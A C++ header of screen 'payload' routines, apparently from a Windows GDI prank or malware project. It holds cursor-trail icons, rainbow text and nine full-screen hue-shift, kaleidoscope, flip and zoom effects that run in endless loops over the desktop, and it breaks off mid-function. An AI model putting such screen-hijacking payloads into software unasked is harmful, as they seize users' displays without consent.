#pragma once
// credits for ChatGPT Ai For A Make GDI
typedef DWORD payload;
// ---------------- RANDOM FONT ----------------
const char* Fonts[] =
{
    "Arial",
    "Comic Sans MS",
    "Verdana",
    "Tahoma",
    "Impact",
    "Courier New",
    "Times New Roman",
    "Segoe UI"
};

payload WINAPI ball666(LPVOID lpvd)
{
    HDC getsa = GetDC(0);
    POINT pt;

    int x = GetSystemMetrics(SM_CXICON) / 2;
    int y = GetSystemMetrics(SM_CYICON) / 2;

    HICON hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2));

    while (true)
    {
        GetCursorPos(&pt);

        DrawIcon(getsa, pt.x - x, pt.y - y, hIcon);
        DrawIcon(getsa, pt.x - 50, pt.y - 50, hIcon);
        DrawIcon(getsa, pt.x - 100, pt.y - 100, hIcon);
        DrawIcon(getsa, pt.x - 150, pt.y - 150, hIcon);
        DrawIcon(getsa, pt.x - 200, pt.y - 200, hIcon);
    }
}

payload WINAPI text666(LPVOID lpvd) {
    srand((unsigned)time(0));

    POINT cpt;
    float hue = 0.0f;
    const char* text = "X";

    HFONT font = NULL;
    int lastFont = -1;

    while (1)
    {
        HDC hdc = GetDC(0);
        GetCursorPos(&cpt);

        // Smooth rainbow cycle
        hue += 1.0f;
        if (hue >= 360.0f) hue = 0.0f;

        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, Hue(hue));

        // Change font occasionally (not every frame)
        if (rand() % 30 == 0)
        {
            if (font) DeleteObject(font);

            int f = rand() % (sizeof(Fonts) / sizeof(Fonts[0]));
            lastFont = f;

            font = CreateFontA(
                42 + rand() % 20,
                0,
                rand() % 360,
                0,
                FW_THIN,
                FALSE,
                FALSE,
                FALSE,
                ANSI_CHARSET,
                OUT_DEFAULT_PRECIS,
                CLIP_DEFAULT_PRECIS,
                ANTIALIASED_QUALITY,
                DEFAULT_PITCH,
                Fonts[f]
            );
        }

        if (font)
            SelectObject(hdc, font);

        TextOutA(hdc, cpt.x, cpt.y, text, lstrlenA(text));

        ReleaseDC(0, hdc);
        Sleep(10);
    }
}


namespace p1 {
    typedef struct
    {
        float h;
        float s;
        float l;
    } HSL;

    namespace Colors
    {
        __forceinline HSL rgb2hsl(const RGBQUAD& rgb)
        {
            float r = rgb.rgbRed * (1.0f / 255.0f);
            float g = rgb.rgbGreen * (1.0f / 255.0f);
            float b = rgb.rgbBlue * (1.0f / 255.0f);

            float minc = min(r, min(g, b));
            float maxc = max(r, max(g, b));
            float delta = maxc - minc;

            HSL out;
            out.l = (maxc + minc) * 0.5f;
            out.h = 0.0f;
            out.s = 0.0f;

            if (delta > 0.00001f)
            {
                out.s = (out.l < 0.5f)
                    ? delta / (maxc + minc)
                    : delta / (2.0f - maxc - minc);

                if (r == maxc)
                    out.h = (g - b) / delta;
                else if (g == maxc)
                    out.h = 2.0f + (b - r) / delta;
                else
                    out.h = 4.0f + (r - g) / delta;

                out.h *= (1.0f / 6.0f);
                if (out.h < 0.0f) out.h += 1.0f;
            }
            return out;
        }

        __forceinline RGBQUAD hsl2rgb(const HSL& hsl)
        {
            float r, g, b;

            if (hsl.s <= 0.00001f)
            {
                r = g = b = hsl.l;
            }
            else
            {
                float q = (hsl.l < 0.5f)
                    ? (hsl.l * (1.0f + hsl.s))
                    : (hsl.l + hsl.s - hsl.l * hsl.s);

                float p = 2.0f * hsl.l - q;

                auto hue = [&](float t)
                    {
                        if (t < 0.0f) t += 1.0f;
                        if (t > 1.0f) t -= 1.0f;
                        if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
                        if (t < 1.0f / 2.0f) return q;
                        if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
                        return p;
                    };

                r = hue(hsl.h + 1.0f / 3.0f);
                g = hue(hsl.h);
                b = hue(hsl.h - 1.0f / 3.0f);
            }

            RGBQUAD rgb;
            rgb.rgbRed = (BYTE)(r * 255.0f);
            rgb.rgbGreen = (BYTE)(g * 255.0f);
            rgb.rgbBlue = (BYTE)(b * 255.0f);
            rgb.rgbReserved = 0;
            return rgb;
        }
    }

    payload WINAPI GDI(LPVOID lpParam)
    {

        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        BITMAPINFO bmi = {};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbq = nullptr;
        HBITMAP dib = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbq, NULL, 0);

        HDC memDC = CreateCompatibleDC(hdc);
        SelectObject(memDC, dib);

        int i = 0;

        while (1)
        {
            BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

            for (int y = 0; y < h; y++)
            {
                int yw = y * w;
                for (int x = 0; x < w; x++)
                {
                    int index = yw + x;

                    int fx = (int)((i * 4)
                        + ((i ^ 4) * sinf(x * (1.0f / 32.0f)))
                        + (i * 4)
                        + ((i ^ 4) * sinf(y * (1.0f / 32.0f))));

                    HSL hsl = Colors::rgb2hsl(rgbq[index]);
                    hsl.h = fmodf((float)fx * (1.0f / 360.0f), 1.0f);
                    rgbq[index] = Colors::hsl2rgb(hsl);
                }
            }

            BitBlt(hdc, 0, 0, w, h, memDC, 0, 0, SRCCOPY);
            i++;
        }

        ReleaseDC(NULL, hdc);
        DeleteDC(memDC);
        return 0x00;
    }
}
namespace p2 {
    typedef struct
    {
        float h;
        float s;
        float l;
    } HSL;

    namespace Colors
    {
        inline HSL rgb2hsl(const RGBQUAD& c)
        {
            float r = c.rgbRed / 255.0f;
            float g = c.rgbGreen / 255.0f;
            float b = c.rgbBlue / 255.0f;

            float maxv = max(r, max(g, b));
            float minv = min(r, min(g, b));
            float h = 0.0f, s = 0.0f;
            float l = (maxv + minv) * 0.5f;

            float d = maxv - minv;
            if (d != 0.0f)
            {
                s = (l < 0.5f) ? (d / (maxv + minv)) : (d / (2.0f - maxv - minv));

                if (maxv == r)      h = (g - b) / d + (g < b ? 6.0f : 0.0f);
                else if (maxv == g) h = (b - r) / d + 2.0f;
                else                h = (r - g) / d + 4.0f;

                h /= 6.0f;
            }

            return { h, s, l };
        }

        inline RGBQUAD hsl2rgb(const HSL& hsl)
        {
            float r, g, b;

            if (hsl.s == 0.0f)
            {
                r = g = b = hsl.l;
            }
            else
            {
                auto hue2rgb = [](float p, float q, float t)
                    {
                        if (t < 0.0f) t += 1.0f;
                        if (t > 1.0f) t -= 1.0f;
                        if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
                        if (t < 1.0f / 2.0f) return q;
                        if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
                        return p;
                    };

                float q = hsl.l < 0.5f
                    ? hsl.l * (1.0f + hsl.s)
                    : hsl.l + hsl.s - hsl.l * hsl.s;
                float p = 2.0f * hsl.l - q;

                r = hue2rgb(p, q, hsl.h + 1.0f / 3.0f);
                g = hue2rgb(p, q, hsl.h);
                b = hue2rgb(p, q, hsl.h - 1.0f / 3.0f);
            }

            RGBQUAD out{};
            out.rgbRed = (BYTE)(r * 255.0f);
            out.rgbGreen = (BYTE)(g * 255.0f);
            out.rgbBlue = (BYTE)(b * 255.0f);
            return out;
        }
    }

    payload WINAPI GDI(LPVOID lpParam)
    {

        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);

        HDC desk = GetDC(NULL);
        HDC mem = CreateCompatibleDC(desk);

        BITMAPINFO bmi{};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = sw;
        bmi.bmiHeader.biHeight = -sh;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbq = nullptr;
        HBITMAP dib = CreateDIBSection(desk, &bmi, DIB_RGB_COLORS, (void**)&rgbq, NULL, 0);
        SelectObject(mem, dib);

        int i = 0;
        const int xSize = sw / 4;
        const int ySize = 8;

        while (1)
        {
            BitBlt(mem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);

            for (int y = 0; y < sh; ++y)
            {
                for (int x = 0; x < sw; ++x)
                {
                    int index = y * sw + x;

                    HSL hsl = Colors::rgb2hsl(rgbq[index]);

                    int fx = (int)((4 * i) + ((4 * i) * sin(x / 32.0)) +
                        (4 * i) + ((4 * i) * sin(y / 24.0)));

                    hsl.h = fmodf((fx / 500.0f) + hsl.h + 0.02f, 1.0f);
                    hsl.s = 1.0f;
                    hsl.h += 0.5f;
                    if (hsl.h > 1.0f) hsl.h -= 1.0f;

                    rgbq[index] = Colors::hsl2rgb(hsl);
                }
            }

            for (int x = 0; x < sw; x++)
            {
                int wave = (int)(sin(x / (float)xSize * M_PI) * ySize);
                BitBlt(mem, x, 0, 1, sh, mem, x, wave, SRCCOPY);
                BitBlt(mem, 0, x, sw, 1, mem, wave, x, SRCCOPY);
            }

            BLENDFUNCTION bf{ AC_SRC_OVER, 0, 111, 0 };
            AlphaBlend(desk, 0, 0, sw, sh, mem, 0, 0, sw, sh, bf);

            i++;

            ReleaseDC(NULL, desk);
            desk = GetDC(NULL);
        }

        ReleaseDC(NULL, desk);
        DeleteDC(mem);
        DeleteObject(dib);
        return 0x00;
    }
}
namespace p3 {
    struct HSV
    {
        float h, s, v;
    };

    namespace Colors
    {
        __forceinline RGBQUAD HSVtoRGB(const HSV& hsv)
        {
            float h = hsv.h;
            float s = hsv.s;
            float v = hsv.v;

            int i = (int)(h * 0.0166667f) % 6;
            float f = h * 0.0166667f - i;

            float p = v * (1.0f - s);
            float q = v * (1.0f - f * s);
            float t = v * (1.0f - (1.0f - f) * s);

            float r, g, b;

            switch (i)
            {
            case 0: r = v; g = t; b = p; break;
            case 1: r = q; g = v; b = p; break;
            case 2: r = p; g = v; b = t; break;
            case 3: r = p; g = q; b = v; break;
            case 4: r = t; g = p; b = v; break;
            default:r = v; g = p; b = q; break;
            }

            return {
                (BYTE)(b * 255.0f),
                (BYTE)(g * 255.0f),
                (BYTE)(r * 255.0f),
                0
            };
        }

        __forceinline HSV RGBtoHSV(const RGBQUAD& c)
        {
            float r = c.rgbRed * 0.0039216f;
            float g = c.rgbGreen * 0.0039216f;
            float b = c.rgbBlue * 0.0039216f;

            float mx = max(r, max(g, b));
            float mn = min(r, min(g, b));
            float d = mx - mn;

            HSV out;
            out.v = mx;
            out.s = mx == 0 ? 0 : d / mx;

            if (d == 0)
                out.h = 0;
            else if (mx == r)
                out.h = 60.0f * fmodf((g - b) / d, 6.0f);
            else if (mx == g)
                out.h = 60.0f * ((b - r) / d + 2.0f);
            else
                out.h = 60.0f * ((r - g) / d + 4.0f);

            if (out.h < 0) out.h += 360.0f;
            return out;
        }
    }
    payload WINAPI GDI(LPVOID lpParam)
    {

        HDC dc = GetDC(nullptr);
        HDC mem = CreateCompatibleDC(dc);

        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        int ws = w / 2;
        int hs = h / 2;

        BITMAPINFO bmi{};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = -hs;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* pixels;
        HBITMAP bmp = CreateDIBSection(dc, &bmi, DIB_RGB_COLORS, (void**)&pixels, 0, 0);
        SelectObject(mem, bmp);

        float angle = 0.0f;
        int tick = 0;

        while (true)
        {
            BitBlt(mem, 0, 0, ws, hs, dc, 0, 0, SRCCOPY);

            float sa = sinf(angle);
            float ca = cosf(angle);

            for (int y = 0; y < hs; y++)
            {
                int dy = y - hs / 2;
                for (int x = 0; x < ws; x++)
                {
                    int dx = x - ws / 2;
                    int idx = y * ws + x;

                    int zx = (int)(ca * dx - sa * dy);
                    int zy = (int)(sa * dx + ca * dy);

                    int fx = zx + zy + tick;

                    HSV hsv = Colors::RGBtoHSV(pixels[idx]);
                    hsv.h = fmodf((float)fx, 360.0f);

                    pixels[idx] = Colors::HSVtoRGB(hsv);
                }
            }

            StretchBlt(dc, 0, 0, w, h, mem, 0, 0, ws, hs, SRCCOPY);

            angle += 0.02f;
            tick += 2;

            Sleep(5); // FAST & SMOOTH
        }

        return 0x00;
    }
}
namespace p4 {
    typedef union _TRGBQUAD
    {
        COLORREF rgborg;
        struct
        {
            BYTE b;
            BYTE g;
            BYTE r;
            BYTE a;
        };
    } TRGBQUAD, * PTRGBQUAD;
    payload WINAPI GDI(LPVOID lpParam)
    {

        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        int ws = w / 2;
        int hs = h / 2;

        BITMAPINFO bmi = {};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = -hs;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* pixels = nullptr;
        HBITMAP bmp = CreateDIBSection(dc, &bmi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
        SelectObject(dcCopy, bmp);

        int i = 0;
        double angle = 0.0;

        while (1)
        {
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            double sa = sin(angle);
            double ca = cos(angle);

#pragma omp parallel for
            for (int y = 0; y < hs; y++)
            {
                for (int x = 0; x < ws; x++)
                {
                    int idx = y * ws + x;

                    int cx = abs(x - ws / 2);
                    int cy = abs(y - hs / 2);

                    int zx = (int)(ca * cx - sa * cy);
                    int zy = (int)(sa * cx + ca * cy);

                    int fx = (int)(
                        (8 * i) +
                        ((8 * i) * sin((zx + i) / 32.0)) +
                        (4 * i) +
                        ((4 * i) * sin((zy + i) / 24.0))
                        );

                    pixels[idx].rgborg += (fx / 4) << (fx / 1024);
                }
            }

            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            i++;
            angle += 0.01;

            Sleep(1);
        }

        return 0x00;
    }
}
namespace p5 {
    typedef struct { float h, s, l; } HSL;

    // ------------------- HSL Functions -------------------
    namespace Colors {
        HSL rgb2hsl(RGBQUAD rgb)
        {
            HSL hsl;
            float r = rgb.rgbRed / 255.f;
            float g = rgb.rgbGreen / 255.f;
            float b = rgb.rgbBlue / 255.f;

            float maxc = max(r, max(g, b));
            float minc = min(r, min(g, b));
            float delta = maxc - minc;

            hsl.l = (maxc + minc) * 0.5f;
            hsl.s = 0.f;
            hsl.h = 0.f;

            if (delta != 0.f)
            {
                hsl.s = (hsl.l < 0.5f) ? (delta / (maxc + minc)) : (delta / (2.f - maxc - minc));
                if (r == maxc) hsl.h = (g - b) / delta;
                else if (g == maxc) hsl.h = 2.f + (b - r) / delta;
                else hsl.h = 4.f + (r - g) / delta;
                hsl.h /= 6.f;
                if (hsl.h < 0.f) hsl.h += 1.f;
            }
            return hsl;
        }

        RGBQUAD hsl2rgb(HSL hsl)
        {
            float r, g, b;
            float h = hsl.h, s = hsl.s, l = hsl.l;

            if (s == 0.f)
            {
                r = g = b = l; // achromatic
            }
            else
            {
                auto hue2rgb = [](float p, float q, float t) -> float {
                    if (t < 0.f) t += 1.f;
                    if (t > 1.f) t -= 1.f;
                    if (t < 1.f / 6.f) return p + (q - p) * 6.f * t;
                    if (t < 1.f / 2.f) return q;
                    if (t < 2.f / 3.f) return p + (q - p) * (2.f / 3.f - t) * 6.f;
                    return p;
                    };
                float q = (l < 0.5f) ? (l * (1.f + s)) : (l + s - l * s);
                float p = 2.f * l - q;
                r = hue2rgb(p, q, h + 1.f / 3.f);
                g = hue2rgb(p, q, h);
                b = hue2rgb(p, q, h - 1.f / 3.f);
            }

            RGBQUAD rgb;
            rgb.rgbRed = (BYTE)(r * 255.f);
            rgb.rgbGreen = (BYTE)(g * 255.f);
            rgb.rgbBlue = (BYTE)(b * 255.f);
            rgb.rgbReserved = 0;
            return rgb;
        }
    }

    payload WINAPI GDI(LPVOID lpParam)
    {

        HDC hdc = GetDC(NULL);
        int ws = GetSystemMetrics(0);
        int hs = GetSystemMetrics(1);

        HDC hdcMem = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = hs;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* pixels = nullptr;
        HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
        SelectObject(hdcMem, bmp);

        int i = 0;

        while (1)
        {
            // Capture current screen
            BitBlt(hdcMem, 0, 0, ws, hs, hdc, 0, 0, SRCCOPY);

            for (int y = 0; y < hs; y++)
            {
                for (int x = 0; x < ws; x++)
                {
                    int index = y * ws + x;

                    // ---------------- Kaleidoscope calculation ----------------
                    int cx = abs(x - (ws / 2));
                    int cy = abs(y - (hs / 2));

                    float angle = i * 0.01f;
                    int zx = (int)(cos(angle) * cx - sin(angle) * cy);
                    int zy = (int)(sin(angle) * cx + cos(angle) * cy);

                    int fx = (zx + i) - (zy + i);

                    HSL hsl = Colors::rgb2hsl(pixels[index]);
                    hsl.h = fmod(fx / 500.f + hsl.h + 0.02f, 1.f);
                    hsl.s = 1.f;
                    hsl.l = 0.5f;

                    pixels[index] = Colors::hsl2rgb(hsl);
                }
            }

            // Draw processed pixels back
            BitBlt(hdc, 0, 0, ws, hs, hdcMem, 0, 0, SRCCOPY);

            // ---------------- Flip screen effect ----------------
            //credits to n17pro3426
            int v = rand() % 3;
            if (v == 0) StretchBlt(hdc, 0, 0, ws, hs, hdc, ws, 0, -ws, hs, SRCCOPY);
            else if (v == 1) StretchBlt(hdc, 0, 0, ws, hs, hdc, 0, hs, ws, -hs, SRCCOPY);
            else if (v == 2) StretchBlt(hdc, 0, 0, ws, hs, hdc, ws, hs, -ws, -hs, SRCCOPY);

            i++;
            Sleep(1);
        }

        DeleteObject(bmp);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdc);

        return 0x00;
    }
}
namespace p6 {

    typedef union _TRGBQUAD {
        COLORREF rgborg;
        struct {
            BYTE r;
            BYTE g;
            BYTE b;
            BYTE Reserved;
        };
    } TRGBQUAD, * PTRGBQUAD;
    payload WINAPI GDI(LPVOID lpParam)
    {

        // Get screen size
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 2;
        int hs = h / 2;

        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi.bmiHeader);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = -hs; // negative for top-down
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* trgb = nullptr;
        HBITMAP bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&trgb, NULL, 0);
        SelectObject(dcCopy, bmp);

        double angle = 0.0;
        int i = 0;

        while (true) {
            // Capture the screen to the smaller bitmap
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            for (int y = 0; y < hs; y++) {
                for (int x = 0; x < ws; x++) {
                    int index = y * ws + x;

                    // Kaleidoscope effect: absolute distance from center
                    int cx = abs(x - (ws / 2));
                    int cy = abs(y - (hs / 2));

                    // Rotation
                    double zx = cos(angle) * cx - sin(angle) * cy;
                    double zy = sin(angle) * cx + cos(angle) * cy;

                    // Dynamic color shift
                    int fx = (int)((zx + i) + (zy + i) + (w - ((zx + i) * 4) + (zy + i)));

                    // Apply to TRGBQUAD
                    trgb[index].rgborg += (fx / 4) << (fx / 1024);
                }
            }

            i++;
            angle += 0.01;

            // Draw the processed bitmap back to screen
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            Sleep(1); // tiny delay for smooth animation
        }

        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        DeleteObject(bmp);

        return 0;
    }
}
namespace p7 {
    typedef struct
    {
        float h;
        float s;
        float l;
    } HSL;

    namespace Colors
    {
        HSL rgb2hsl(RGBQUAD rgb)
        {
            HSL hsl;
            float r = rgb.rgbRed / 255.f;
            float g = rgb.rgbGreen / 255.f;
            float b = rgb.rgbBlue / 255.f;

            float maxC = fmaxf(fmaxf(r, g), b);
            float minC = fminf(fminf(r, g), b);
            float delta = maxC - minC;

            hsl.l = (maxC + minC) / 2.f;

            if (delta == 0.f)
            {
                hsl.h = 0.f;
                hsl.s = 0.f;
            }
            else
            {
                hsl.s = (hsl.l < 0.5f) ? (delta / (maxC + minC)) : (delta / (2.f - maxC - minC));

                if (r == maxC) hsl.h = (g - b) / delta + (g < b ? 6.f : 0.f);
                else if (g == maxC) hsl.h = (b - r) / delta + 2.f;
                else hsl.h = (r - g) / delta + 4.f;

                hsl.h /= 6.f;
            }

            return hsl;
        }

        RGBQUAD hsl2rgb(HSL hsl)
        {
            float r, g, b;
            if (hsl.s == 0.f)
            {
                r = g = b = hsl.l;
            }
            else
            {
                auto hue2rgb = [](float p, float q, float t) -> float
                    {
                        if (t < 0.f) t += 1.f;
                        if (t > 1.f) t -= 1.f;
                        if (t < 1.f / 6.f) return p + (q - p) * 6.f * t;
                        if (t < 1.f / 2.f) return q;
                        if (t < 2.f / 3.f) return p + (q - p) * (2.f / 3.f - t) * 6.f;
                        return p;
                    };

                float q = hsl.l < 0.5f ? hsl.l * (1.f + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
                float p = 2.f * hsl.l - q;
                r = hue2rgb(p, q, hsl.h + 1.f / 3.f);
                g = hue2rgb(p, q, hsl.h);
                b = hue2rgb(p, q, hsl.h - 1.f / 3.f);
            }

            RGBQUAD rgb;
            rgb.rgbRed = (BYTE)(r * 255.f);
            rgb.rgbGreen = (BYTE)(g * 255.f);
            rgb.rgbBlue = (BYTE)(b * 255.f);
            rgb.rgbReserved = 0;
            return rgb;
        }
    }
    payload WINAPI GDI(LPVOID lpParam)
    {

        HDC hdcScreen = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h; // top-down
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        void* pixels;
        HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &pixels, NULL, 0);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        SelectObject(hdcMem, hBitmap);

        RGBQUAD* rgbq = (RGBQUAD*)pixels;

        float angle = 0.f;
        int i = 0;
        int ws = w, hs = h;

        while (true)
        {
            BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

            for (int y = 0; y < h; y++)
            {
                for (int x = 0; x < w; x++)
                {
                    int index = y * w + x;
                    RGBQUAD px = rgbq[index];

                    HSL hsl = Colors::rgb2hsl(px);

                    // Kaleidoscope effect
                    int cx = abs(x - (ws / 2));
                    int cy = abs(y - (hs / 2));

                    int zx = (int)(cos(angle) * cx - sin(angle) * cy);
                    int zy = (int)(sin(angle) * cx + cos(angle) * cy);

                    int fx = (int)(i + (i * cos(zx / 16.0)) + i + (i * cos(zy / 8.0)) +
                        i + (i * cos(((zx + i) + (zy + i)) / 16.0)) +
                        i + (i * sin(sqrt((double)(zx * zx + zy * zy)) / 8.0))) / 4;

                    hsl.h = fmodf(fx / 500.f + hsl.h + 0.02f, 1.f);
                    hsl.s = 1.f;
                    hsl.l = 0.5f;

                    rgbq[index] = Colors::hsl2rgb(hsl);
                }
            }

            BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
            angle += 0.01f;
            i++;
        }

        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return 0;
    }
}
namespace p8 {
    typedef union _TRGBQUAD {
        COLORREF rgborg;
        struct {
            BYTE r;
            BYTE g;
            BYTE b;
            BYTE reserved;
        };
    } TRGBQUAD, * PTRGBQUAD;

    payload WINAPI GDI(LPVOID lpParam)
    {

        // Get screen size
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        int ws = w / 2;
        int hs = h / 2;

        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        // Create DIB section
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* trgbquad = nullptr;
        HBITMAP bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&trgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        FLOAT a = 5.0f;
        FLOAT b = 3.0f;

        double angle = 0.0;
        int i = 0;

        while (1) {
            // Copy screen to smaller buffer
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            // Random shift for plasma
            int randx = rand() % ws;
            int randy = rand() % hs;

            // Process each pixel
            for (int y = 0; y < hs; y++) {
                for (int x = 0; x < ws; x++) {
                    int index = y * ws + x;

                    int cx = x - randx;
                    int cy = y - randy;

                    int zx = (int)((cx * cx) / (a * a));
                    int zy = (int)((cy * cy) / (b * b));

                    int fx = (int)(128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0)) + (w - (zx * 4) + zy) * i);

                    trgbquad[index].rgborg += (fx / 4) << (fx / 1024);
                }
            }

            i++;
            angle += 0.01;

            // Stretch back to full screen
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            // Reversed tunnel effect (zoom out)
            StretchBlt(dc, -20, -20, w + 40, h + 40, dc, 0, 0, w, h, SRCCOPY);

            Sleep(1);
        }

        DeleteObject(bmp);
        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }
}
namespace p9 {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    double angle = 0.0;

    // -------------------------------------------------
    // HSV struct
    // -------------------------------------------------
    typedef struct
    {
        FLOAT h;
        FLOAT s;
        FLOAT v;
    } HSV;

    // -------------------------------------------------
    // Color conversion
    // -------------------------------------------------
    namespace Colors
    {
        RGBQUAD HSVtoRGB(const HSV& hsv)
        {
            double h = hsv.h;
            double s = hsv.s;
            double v = hsv.v;

            int hi = (int)(h / 60.0) % 6;
            double f = h / 60.0 - floor(h / 60.0);

            double p = v * (1.0 - s);
            double q = v * (1.0 - f * s);
            double t = v * (1.0 - (1.0 - f) * s);

            RGBQUAD c = {};

            switch (hi)
            {
            case 0: c.rgbRed = v * 255; c.rgbGreen = t * 255; c.rgbBlue = p * 255; break;
            case 1: c.rgbRed = q * 255; c.rgbGreen = v * 255; c.rgbBlue = p * 255; break;
            case 2: c.rgbRed = p * 255; c.rgbGreen = v * 255; c.rgbBlue = t * 255; break;
            case 3: c.rgbRed = p * 255; c.rgbGreen = q * 255; c.rgbBlue = v * 255; break;
            case 4: c.rgbRed = t * 255; c.rgbGreen = p * 255; c.rgbBlue = v * 255; break;
            default:c.rgbRed = v * 255; c.rgbGreen = p * 255; c.rgbBlue = q * 255; break;
            }

            return c;
        }

        HSV RGBtoHSV(const RGBQUAD& c)
        {
            double r = c.rgbRed / 255.0;
            double g = c.rgbGreen / 255.0;
            double b = c.rgbBlue / 255.0;

            double cmax = max(r, max(g, b));
            double cmin = min(r, min(g, b));
            double delta = cmax - cmin;

            HSV hsv = {};
            hsv.v = (FLOAT)cmax;
            hsv.s = (cmax == 0.0) ? 0.0f : (FLOAT)(delta / cmax);

            if (delta == 0.0)
                hsv.h = 0.0f;
            else if (cmax == r)
                hsv.h = (FLOAT)(60.0 * fmod(((g - b) / delta), 6.0));
            else if (cmax == g)
                hsv.h = (FLOAT)(60.0 * (((b - r) / delta) + 2.0));
            else
                hsv.h = (FLOAT)(60.0 * (((r - g) / delta) + 4.0));

            if (hsv.h < 0.0f)
                hsv.h += 360.0f;

            return hsv;
        }
    }
    payload WINAPI GDI(LPVOID lpParam)
    {

        HDC dc = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(dc);

        int ws = w / 2;
        int hs = h / 2;

        BITMAPINFO bmi = {};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = -hs;
        bmi.bmiHeader.biPlanes = 1;
